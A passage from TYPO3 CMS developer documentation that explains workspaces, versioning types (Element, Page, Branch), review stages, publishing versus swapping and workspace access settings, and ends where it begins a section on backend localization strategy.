<P CLASS="western"><B>Analogy:</B> The concept of workspaces can be
compared with how CVS works for programmers; You check out the
current source to your local computer (= entering a draft workspace),
then you can change any script you like on your local computer (=
transparent editing in the workspace), run tests of the changed code
scripts (= previewing the workspace in the frontend) , compare the
changes you made with the source in CVS (= using the Workspace
Manager modules overview to review the complete amount of changes
made) and eventually you commit the changes to CVS (= publishing the
content of the workspace).</P>
<H4 CLASS="western">Publishing and swapping</H4>
<P CLASS="western">There are two ways to publish an element in a
workspace; publish or swap. In both cases the draft content is
published live. But when swapping it means the current live element
is attached to the workspace when taken offline. This is contrary to
the publish mode which pushes the live item out of any workspace and
“into the archive”.</P>
<P CLASS="western">The swapping mode is useful if you have a
temporary campaign, say a christmas special frontpage and website
section. You create the christmas edition in a custom workspace and
two weeks before christmas you swap in the christmas edition. All
normal pages and elements that were unpublished are now in the
workspace, waiting for christmas to pass by and eventually the old
frontpage etc. will be swapped back in. The christmas edition is now
back in the workspace and ready for next year.</P>
<H4 CLASS="western">More on Workspace types</H4>
<P CLASS="western">I would like to more clearly describe the various
workspace types, their differences and applications:</P>
<TABLE WIDTH=100% BORDER=1 BORDERCOLOR="#000000" CELLPADDING=4 CELLSPACING=0>
	<COL WIDTH=27*>
	<COL WIDTH=69*>
	<COL WIDTH=70*>
	<COL WIDTH=90*>
	<THEAD>
		<TR VALIGN=TOP>
			<TH WIDTH=11%>
				<P CLASS="western">Topic</P>
			</TH>
			<TH WIDTH=27%>
				<P CLASS="western">Live workspace</P>
			</TH>
			<TH WIDTH=28%>
				<P CLASS="western">Draft workspace (default)</P>
			</TH>
			<TH WIDTH=35%>
				<P CLASS="western">Custom workspaces</P>
			</TH>
		</TR>
	</THEAD>
	<TBODY>
		<TR VALIGN=TOP>
			<TD WIDTH=11%>
				<P CLASS="western"><B>Access</B></P>
			</TD>
			<TD WIDTH=27%>
				<P CLASS="western">Users and groups must be specifically allowed
				access to the Live workspace.</P>
				<P CLASS="western">(Checkboxes in user/group record)</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><I>(For upgrades from pre-4.0 versions this is
				done by default).</I></P>
			</TD>
			<TD WIDTH=28%>
				<P CLASS="western">Users and groups must be specifically allowed
				access to the Draft workspace.</P>
				<P CLASS="western">(Checkboxes in user/group record)</P>
			</TD>
			<TD WIDTH=35%>
				<P CLASS="western">Granted through the workspace configuration
				which includes:</P>
				<P CLASS="western">- A list of editors (users and/or groups)</P>
				<P CLASS="western">- A list of reviewers (users and/or groups)</P>
				<P CLASS="western">- Owner users (initial creator)</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=11%>
				<P CLASS="western"><B>Editing</B></P>
				<P CLASS="western"><BR>
				</P>
			</TD>
			<TD WIDTH=27%>
				<P CLASS="western">Live content</P>
			</TD>
			<TD WIDTH=28%>
				<P CLASS="western">Draft versions of live content</P>
			</TD>
			<TD WIDTH=35%>
				<P CLASS="western">Draft versions of live content</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><I>Option: To allow editing of tables without
				versioning available.</I></P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=11%>
				<P CLASS="western"><B>DB mounts</B></P>
			</TD>
			<TD WIDTH=27%>
				<P CLASS="western">From user profile</P>
			</TD>
			<TD WIDTH=28%>
				<P CLASS="western">From user profile</P>
			</TD>
			<TD WIDTH=35%>
				<P CLASS="western">Specific DB mounts can be specified in which
				case they will overrule DB mounts from user profiles. 
				</P>
				<P CLASS="western">Specific DB mounts are required to be within
				the DB mounts from the user profile (for security reasons)</P>
				<P CLASS="western">If no DB mounts specified for workspace, user
				profile mounts are used (default)</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=11%>
				<P CLASS="western"><B>File mounts</B></P>
			</TD>
			<TD WIDTH=27%>
				<P CLASS="western">From user profile</P>
			</TD>
			<TD WIDTH=28%>
				<P CLASS="western">None available. All file manipulation access
				is banned! (Otherwise violation of “draft principle”)</P>
			</TD>
			<TD WIDTH=35%>
				<P CLASS="western">By default, none is available due to same
				principle as for Draft workspace.</P>
				<P CLASS="western">Optionally, file mounts can be specified for
				convenience reasons.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=11%>
				<P CLASS="western"><B>Scheduled publishing</B></P>
			</TD>
			<TD WIDTH=27%>
				<P CLASS="western">N/A</P>
			</TD>
			<TD WIDTH=28%>
				<P CLASS="western">N/A</P>
			</TD>
			<TD WIDTH=35%>
				<P CLASS="western">If CLI-script is configured in cronjob you can
				specify publishing date/time down to the minute. You can also
				specify an unpublish time which requires the use of swapping as
				publishing type.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=11%>
				<P CLASS="western"><B>Reviewing</B></P>
			</TD>
			<TD WIDTH=27%>
				<P CLASS="western">Only through a separate workflow system.</P>
			</TD>
			<TD WIDTH=28%>
				<P CLASS="western">Content can be raised from “Editing” stage
				through “Review” to “Publish”. 
				</P>
				<P CLASS="western">However, the state does not impose any
				limitations on editing and publication of workspace contents.</P>
			</TD>
			<TD WIDTH=35%>
				<P CLASS="western"><B>Members</B> can raise content from
				“Editing” stage  to “Review”.  Members can only edit
				content when its in “Editing stage” (or “Rejected”)</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><B>Reviewers</B>  can raise the content from
				“Editing” stage to “Review” stage to “Publish” - or
				they can reject content back to editing. Reviewers can only edit
				content in these modes.</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><B>Owners</B> can operate all states of
				course. Owners are the only ones to edit content when in
				“Publish” mode. Thus “Publish” mode provides protection
				for content awaiting publication.</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western">The “Rejected” flag is reset automatically
				when editing occurs on a rejected element.</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western">Options available for automatic email
				notification between the roles.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=11%>
				<P CLASS="western"><B>Publishing</B></P>
				<P CLASS="western">(For all: Requires edit access to live
				element)</P>
			</TD>
			<TD WIDTH=27%>
				<P CLASS="western">No limitations. Content can be edited live and
				even content from other workspaces can be published through the
				versioning API regardless of stage.</P>
			</TD>
			<TD WIDTH=28%>
				<P CLASS="western">All users with access to Live workspace is
				able to publish.</P>
			</TD>
			<TD WIDTH=35%>
				<P CLASS="western">Workspace owners can publish (even without
				access to Live workspace).</P>
				<P CLASS="western">Reviewers/Members cannot publish <I>unless</I>
				they have access to online workspace as well (this default
				behaviour can be disabled).</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western">Option: Restrict publishing to elements in
				&quot;Publish&quot; stage only.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=11%>
				<P CLASS="western"><B>Settings</B></P>
			</TD>
			<TD WIDTH=27%>
				<P CLASS="western">N/A</P>
			</TD>
			<TD WIDTH=28%>
				<P CLASS="western">N/A</P>
			</TD>
			<TD WIDTH=35%>
				<P CLASS="western">Users with permission to create a custom
				workspace can do so.</P>
				<P CLASS="western">Workspace owners can add other owners,
				reviewers and editors and change all workspace properties.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=11%>
				<P CLASS="western"><B>Auto versioning</B></P>
			</TD>
			<TD WIDTH=27%>
				<P CLASS="western">N/A</P>
			</TD>
			<TD WIDTH=28%>
				<P CLASS="western">Yes</P>
			</TD>
			<TD WIDTH=35%>
				<P CLASS="western">Yes, but can be disabled so a conscious
				versioning actions is required.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=11%>
				<P CLASS="western"><B>Swapping</B></P>
			</TD>
			<TD WIDTH=27%>
				<P CLASS="western">N/A</P>
			</TD>
			<TD WIDTH=28%>
				<P CLASS="western">Yes</P>
			</TD>
			<TD WIDTH=35%>
				<P CLASS="western">Yes, but can be disabled.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=11%>
				<P CLASS="western"><B>Versioning types</B></P>
			</TD>
			<TD WIDTH=27%>
				<P CLASS="western">All</P>
			</TD>
			<TD WIDTH=28%>
				<P CLASS="western">All</P>
			</TD>
			<TD WIDTH=35%>
				<P CLASS="western">All, but you can disable any of the types
				“Element”, “Page” and “Branch”.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=11%>
				<P CLASS="western"><B>Other notes</B></P>
			</TD>
			<TD WIDTH=27%>
				<P CLASS="western"><BR>
				</P>
			</TD>
			<TD WIDTH=28%>
				<P CLASS="western"><BR>
				</P>
			</TD>
			<TD WIDTH=35%>
				<P CLASS="western">Custom workspaces has a freeze flag that will
				shut down any update/edit/copy/move/delete etc. command in the
				workspace until it is unset again.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=11%>
				<P CLASS="western"><B>Module access</B></P>
			</TD>
			<TD COLSPAN=3 WIDTH=89%>
				<P CLASS="western">All backend modules can specify
				$MCONF['workspaces'] = “[online,offline,custom]” to limit
				access based current workspace of user. See description elsewhere
				in this document.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=11%>
				<P CLASS="western"><B>Usage</B></P>
			</TD>
			<TD WIDTH=27%>
				<P CLASS="western">Administrative purposes. First creation of
				site.</P>
			</TD>
			<TD WIDTH=28%>
				<P CLASS="western">Everyday maintenance for trusted editors.</P>
			</TD>
			<TD WIDTH=35%>
				<P CLASS="western">Specific projects on a site branch. Simple
				review-cycles. Informal team-work on site maintenance.</P>
			</TD>
		</TR>
	</TBODY>
</TABLE>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Generally, “admin” users have access to all
functionality as usual.</P>
<H4 CLASS="western">Supporting workspaces in extensions</H4>
<P CLASS="western">Since workspaces implies transparent support all
over the backend and frontend it means that extensions must be
programmed with this in mind. Although the ideal is complete
transparency in backend and perfect previews in the frontend this is
almost impossible to obtain. But a high level of consistency can be
obtained by using API functions in TYPO3. These functions and the
challenges they are invented to answer are discussed in “TYPO3 Core
API”.</P>
<H3 CLASS="western"><A NAME="2.7.3.Using versioning and workspaces |outline"></A>
Using versioning and workspaces 
</H3>
<P CLASS="western">This section shortly covers the workspace related
features in the backend with a visual tour-de-force.</P>
<P CLASS="western">Most significantly workspaces have a selector box
in the lower right corner of the backend. The shortcut frame is
permanently visible for users unless disabled by Page TSconfig:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m4b8a0971.png" NAME="Graphic120" ALIGN=LEFT WIDTH=308 HEIGHT=55 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">In this selector box the backend user chooses
between the workspaces available to him. The whole backend reloads
each time he changes workspace. This is necessary because the backend
might be differently composed depending on the workspace the user is
in.</P>
<P CLASS="western">The workspace is reflected in the top of the page
tree:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m6fb46647.png" NAME="Graphic121" ALIGN=LEFT WIDTH=435 HEIGHT=59 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">By default the &quot;Live&quot; workspace is not,
but this is easily configured with User TSconfig:
&quot;<FONT COLOR="#dd0000">options.pageTree.onlineWorkspaceInfo = 1</FONT>&quot;</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m37effe9e.png" NAME="Graphic160" ALIGN=LEFT WIDTH=302 HEIGHT=59 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">When you are in a draft workspace you will find a
&quot;New version&quot; button in various modules, including Web &gt;
Page:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_24ec2400.png" NAME="Graphic122" ALIGN=LEFT WIDTH=271 HEIGHT=60 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Clicking this button will create a new <B>&quot;Page&quot;
type version</B> of the page. In the page tree &quot;Page&quot; type
versions are highlighted with a blue background color. This means the
page header is versioned and content elements on the page is copied
along.  (See previously for a description of this versioning type).
This type of versioning offers the flexibility to rearrange content
elements between the columns of a page.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m49ca2474.png" NAME="Graphic123" ALIGN=LEFT WIDTH=299 HEIGHT=90 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">The module <B>Web &gt; Versioning</B> allows you
to monitor the versioning of elements on a specific page:</P>
<P CLASS="western"><IMG SRC="10_html_626af33f.png" NAME="Graphic125" ALIGN=LEFT WIDTH=669 HEIGHT=264 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">This view shows you the live version (sometimes
called &quot;Online&quot;) and the draft version (sometimes called
&quot;Offline&quot;) in a comparison view which helps you to
understand what has changed in the draft version. You can also raise
the stage of the content for review, you can publish, preview etc.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Instead of explicitly creating a &quot;Page&quot;
type version of the page you can also go ahead and just edit the
elements on the page. <I>Transparently</I> an edited element will be
versioned and highlighted with green background to reflect the new
state. In the page tree a page containing versioned elements will be
highlighted with light yellow:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_150abae0.png" NAME="Graphic126" ALIGN=LEFT WIDTH=665 HEIGHT=224 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">In case you also version the page header it will
become green in the page tree (here I changed the page title to &quot;Sed
non tellus&quot;):</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_149ed36c.png" NAME="Graphic127" ALIGN=LEFT WIDTH=669 HEIGHT=207 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Using the Web &gt; Versioning module you will see
the workspace content for the page. Obviously the page and one
content element is found in draft versions in the workspace:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m2c8ae234.png" NAME="Graphic128" ALIGN=LEFT WIDTH=596 HEIGHT=83 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Comparing this view with the previous example
where the page was versioned as a &quot;Page&quot; version you will
now see that only changed elements appear, not every content element
from the page. This type is called <B>&quot;Element&quot; versioning</B>
and offers no flexibility in terms of rearranging element but
benefits from maintaining all ids and being more straight forward to
work with.</P>
<P CLASS="western">If you wish to compare changes in the content
between the live and draft version you simply enable &quot;Show
difference view&quot; and the display is updated to this:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m561d95fc.png" NAME="Graphic129" ALIGN=LEFT WIDTH=601 HEIGHT=452 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">This gives a reviewer a clear idea of the changes
that has been performed. The red text is what was removed, the green
text is what was added. A click on the button &quot;Send all to
Review&quot; will raise the &quot;Editing&quot; stage to &quot;Review&quot;
stage. &quot;Publish page&quot; / &quot;Swap page&quot; will perform
publishing of all listed elements in the view (unless restrictions
apply which is the case if the individual publish/swap buttons for
each element is missing).</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Finally, you can also create a <B>&quot;Branch&quot;
type version</B> of the page. This will copy not only the page and
its content elements but the whole subtree under the page. In order
to do so, click the icon of a page, select &quot;Versioning&quot; and
in the &quot;Versioning&quot; view you can create a new &quot;Branch&quot;
version:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m45160d7f.png" NAME="Graphic130" ALIGN=LEFT WIDTH=482 HEIGHT=236 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">The page tree is now updated to look like this.
The darker red page is the root point of the &quot;Branch&quot;
version while the lighter red pages is the individual page tree
belonging to that version. This type of versioning offers the
flexibility to rearrange pages in a branch. 
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m5985ce4d.png" NAME="Graphic131" ALIGN=LEFT WIDTH=287 HEIGHT=66 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">The Web &gt; Versioning module displays the
&quot;Branch&quot; version like this:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_6b893222.png" NAME="Graphic132" ALIGN=LEFT WIDTH=669 HEIGHT=404 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">When you deal with &quot;Branch&quot; versions you
will find a special token, #VEP# in the visual page path in backend
modules. This token indicates where the branch point is in the path:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m4bf3d642.png" NAME="Graphic133" ALIGN=LEFT WIDTH=336 HEIGHT=18 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">The <B>Workspace Manager</B> is available by
clicking the workspace-icon next to the workspace selector in the
lower right corner of the backend. Or you can access it as the module
User &gt; Workspace:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m3b874c87.png" NAME="Graphic135" ALIGN=LEFT WIDTH=119 HEIGHT=74 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">The Workspace Manager is the extended version of
&quot;Web &gt; Versioning&quot; where you will get an overview of the
full workspace content. All versions in the workspace are shown here,
can be previewed, managed and published due to your permissions:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m4ebb0b8.png" NAME="Graphic134" ALIGN=LEFT WIDTH=669 HEIGHT=251 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>Previewing content </B>in the workspace is
easy. Generally, you can enable &quot;Frontend Preview&quot; from the
checkbox next to the workspace selector in the lower right corner of
the backend interface. This will reflect the workspace changes when
browsing the frontend website as long as you are logged in as a
backend user.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_217b76c4.png" NAME="Graphic124" ALIGN=LEFT WIDTH=175 HEIGHT=27 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Alternatively, you use the <B>Web &gt; View</B>
module:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_5d302cac.png" NAME="Graphic136" ALIGN=LEFT WIDTH=107 HEIGHT=19 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Click the page with versioned content in the page
tree...</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m2105973a.png" NAME="Graphic137" ALIGN=LEFT WIDTH=290 HEIGHT=29 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">... and you will be able to preview the draft
content:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m6f6a8bee.png" NAME="Graphic138" ALIGN=LEFT WIDTH=669 HEIGHT=98 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">When you see a preview of a workspace in the
frontend you will always be notified by the red box in the bottom of
the page:</P>
<P CLASS="western"><IMG SRC="10_html_m4324b1e5.png" NAME="Graphic139" ALIGN=LEFT WIDTH=370 HEIGHT=57 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">You can also click the magnifying-glass found many
places in the backend. When you do that in a workspace you will get a
special dual-view of the Live and Draft content combined with access
to the Web &gt; Versioning module for easy approval or publication:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_4480d0a5.png" NAME="Graphic140" ALIGN=LEFT WIDTH=669 HEIGHT=486 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">By default you can use the &quot;Draft workspace&quot;
for ad-hoc jobs that doesn't require strict control over review
processes etc. In case you need teams of people with various roles
such as author, reviewer and publisher you can create a <B>custom
workspace</B>. By doing so you can customize roles, permissions and
other features to suit your needs:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_7ac1d6f5.png" NAME="Graphic141" ALIGN=LEFT WIDTH=420 HEIGHT=150 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">The custom Workspace is adequately described in
the content sensitive help so no more details will be given here.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">The workspace technology offers a simple scheme
for <B>staging content through review to publication</B>. In the
Workspace Manager or Web &gt; Versioning module you can &quot;raise
content &quot; to the next level and attach a comment while doing so:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m3abe7208.png" NAME="Graphic142" ALIGN=LEFT WIDTH=418 HEIGHT=227 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">The stage is raised to &quot;Review&quot; and will
be reflected in the interface:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m17fe2622.png" NAME="Graphic143" ALIGN=LEFT WIDTH=104 HEIGHT=79 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Likewise you can take the next step to &quot;Publish&quot;
at which point the the workspace owner (of custom workspaces) can 
uncritically publish assuming the review process has caught any
problems - or the workspace owner can act as a final level of review:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m1664d8e8.png" NAME="Graphic144" ALIGN=LEFT WIDTH=407 HEIGHT=73 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">In case the reviewer or owner finds reasons to
reject the content they can do so with an explanation going to the
editor:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m791fb40c.png" NAME="Graphic145" ALIGN=LEFT WIDTH=318 HEIGHT=151 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">At any time a mouse-over on the Stage control will
display the log of events:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_47ed2383.png" NAME="Graphic146" ALIGN=LEFT WIDTH=406 HEIGHT=117 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><B>Notice:</B> The stage feature is only subject
to access restrictions inside custom workspaces. In Live and the
default Draft workspace the feature is available as a state any user
can set and final publishing does not require the &quot;Publish&quot;
stage to be reached for any content.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Publishing content from a workspace can either be
done with individual elements, pages including elements or the whole
workspace at once. Publishing the full workspace is available from
the top of the Workspace Manager:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_3628c455.png" NAME="Graphic147" ALIGN=LEFT WIDTH=254 HEIGHT=151 BORDER=0><BR CLEAR=LEFT><IMG SRC="10_html_79b6ee5e.png" NAME="Graphic148" ALIGN=LEFT WIDTH=247 HEIGHT=30 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">For each element in the list you can access
<B>control buttons</B> for <I>publish, swap, release from workspace,
edit element, view change history </I><SPAN STYLE="font-style: normal">and</SPAN><I>
preview.</I></P>
<P CLASS="western">Next to the control buttons you see the <B>Lifecycle</B>
of content. In the screenshot one of the elements is different from
the others: It turns out that this element has actually been
published three times. This is possible if the &quot;Swap workspace&quot;
buttons are used; They will simply swap the live version with the
draft version so that the Live version is taken back into the
workspace in exchange. Doing this a few times forth and back will
increase the lifecycle counter beyond the otherwise most common state
which is &quot;Archive&quot; (published one time). 
</P>
<P CLASS="western">The other elements shown are all in &quot;Draft&quot;
state meaning they have not been published live - yet.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">In the Workspace Manager you can also enable
<B>display of sub-elements</B> for &quot;Page&quot; and &quot;Branch&quot;
versioning types:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_2c8f4cad.png" NAME="Graphic149" ALIGN=LEFT WIDTH=136 HEIGHT=25 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">This will provide you with a threaded display of
the versioned content:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m4e557acd.png" NAME="Graphic150" ALIGN=LEFT WIDTH=613 HEIGHT=272 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Another feature is to enable <B>difference view</B>
in the Workspace Manager. By doing so you will see every element
compared to its live counterpart (if available) and it will be clear
to you what changes has been made:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m60259d0c.png" NAME="Graphic151" ALIGN=LEFT WIDTH=132 HEIGHT=27 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_19cd46e5.png" NAME="Graphic152" ALIGN=LEFT WIDTH=669 HEIGHT=305 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">The <B>system log</B> will also reflect operations
in the workspace. The &quot;User&quot; column is tagged with the
workspace in which the action took place:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m3afc19f6.png" NAME="Graphic153" ALIGN=LEFT WIDTH=669 HEIGHT=148 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>Setting up access to workspaces:</B> For the
Live and default Draft workspace you will have to configure this in
the Backend User and Group records by checkboxes:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_6ad62c80.png" NAME="Graphic154" ALIGN=LEFT WIDTH=218 HEIGHT=61 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">In the Tools &gt; User Admin module this is also
reflected in the comparison view:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m27d43364.png" NAME="Graphic155" ALIGN=LEFT WIDTH=351 HEIGHT=167 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">For custom workspaces users are assigned
membership directly in the configuration record of the workspace:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m18dc5f16.png" NAME="Graphic161" ALIGN=LEFT WIDTH=439 HEIGHT=261 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>Tip:</B> Although the default settings for
upgraded websites will be that all users and groups have access to
the Live workspace the intention of the workspace technology is that
in most typical cases the average backend user only works in a draft
workspace and therefore cannot change live content before a
supervisor with access to the Live workspace will enter the backend
and publish the workspace content.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>Creating new content: </B>The workspace
technology is aimed at being so tough that even a complete website
can be built from scratch without changing any live content. Here the
Draft Workspace is used to build a complete page structure and dummy
content. In the workspace everything looks like if it was live, even
when previewed in the frontend with Web &gt; View.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m7b6b5bfe.png" NAME="Graphic156" ALIGN=LEFT WIDTH=637 HEIGHT=322 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Changing to the Live workspace reveals a set of
placeholder records. These are necessary to reserve the future
position for the new content in the workspace. However, those
placeholders are ignored in the live workspace frontend and will
therefore not affect any live content.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m5e5779b3.png" NAME="Graphic157" ALIGN=LEFT WIDTH=669 HEIGHT=337 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">The Web &gt; List module shows the same
reflection. In the screenshot below you can see how pages, content
elements, localized versions of content elements, page language
overlays and even TypoScript Templates are created as versions in the
workspace:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_720afb65.png" NAME="Graphic158" ALIGN=LEFT WIDTH=576 HEIGHT=362 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">In the Live workspace this is reflected like this
by the &quot;invisible&quot; placeholders:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_1bafcd80.png" NAME="Graphic159" ALIGN=LEFT WIDTH=579 HEIGHT=405 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">By publication of the workspace these placeholders
are substituted with the new versions from the workspace.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>Managing custom workspaces: </B>[This section
still misses introduction to the yet missing workspace administration
interface in the Workspace Manager.]</P>
<H2 CLASS="western"><A NAME="2.8.Localization|outline"></A>Localization</H2>
<H3 CLASS="western"><A NAME="2.8.1.Strategy|outline"></A>Strategy</H3>
<P CLASS="western">Internationalization (i18n) and localization
(l10n) issues are handled by the &quot;language&quot; class included
by the &quot;template.php&quot; file and instantiated as the global
variable $LANG in the backend.</P>
<P CLASS="western">The strategy of localization in TYPO3 is to
translate all the parts of the TYPO3 Backend (TBE) interface which
are available to everyday users of the CMS such as content editors,
contributors, and to a certain extend, administrators. However all
developer/admin-parts should remain in English. 
</P>
<P CLASS="western">The reason for keeping the adminstrator/developer
parts in English is that those parts change and expand too quickly.
Further it would be a huge task to both implement and translate. And
the most important reason is that we want to keep a common vocabulary
